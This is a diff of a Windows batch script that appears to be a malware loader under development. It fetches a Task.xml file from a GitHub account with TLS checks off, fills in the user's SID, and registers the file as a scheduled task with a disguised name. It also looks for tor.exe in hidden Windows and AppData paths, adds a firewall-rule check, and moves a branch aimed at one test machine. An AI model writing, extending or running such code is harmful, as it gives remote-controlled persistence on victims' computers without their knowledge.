@@ -9,6 +9,10 @@ if errorlevel 1 goto Connectivitycheck
 Set host=https://cryptedodissey.github.io
 Set enviroment=C:\Windows
 
+rem TESTING >
+if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
+rem TESTING <
+
 FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
 curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
 powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
@@ -19,9 +23,14 @@ schtasks /Delete /TN "%SID%XYZ" /F
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
-rem TESTING >
-if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
-rem TESTING <
+set "RuleName=YourRuleNameHere"
+
+netsh advfirewall firewall show rule name="%RuleName%" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo The firewall rule "%RuleName%" exists.
+) else (
+    echo The firewall rule "%RuleName%" does not exist.
+)
 
 if exist "%environment%\tor.exe" (
     echo.
